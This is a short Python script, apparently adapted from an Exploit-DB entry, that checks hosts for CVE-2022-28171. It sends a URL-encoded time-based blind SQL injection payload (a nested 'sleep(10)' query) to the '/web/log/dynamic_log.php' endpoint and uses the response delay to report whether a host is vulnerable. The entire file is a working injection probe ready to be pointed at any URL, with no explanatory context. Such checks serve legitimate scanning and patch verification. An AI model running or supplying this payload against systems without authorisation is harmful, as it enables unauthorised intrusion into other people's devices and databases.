# Reference: https://www.exploit-db.com/exploits/51607

import time
import requests

path = "/web/log/dynamic_log.php"

def is_response_time_delayed(response_time, delay):
	return response_time >= delay

def probe_blind_sqli(url):
    # '(select*from(select(sleep(10)))a)'
    payload = "%27%28select%2Afrom%28select%28sleep%2810%29%29%29a%29%27"
    params = {
        'target': 'makeMaintainLog',
        'downloadtype': payload
    }
    headers = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36',
        'Connection': 'close'
    }

    start_time = time.time()
    response = requests.get(f"{url}{path}", headers=headers, params=params)
    end_time = time.time()

    response_time = end_time - start_time # in seconds
    if is_response_time_delayed(response_time, 10):
    	print(f"{url} is vulnerable to CVE-2022-28171 via blind sqli")
    else:
    	print(f"{url} is not vulnerable to CVE-2022-28171")
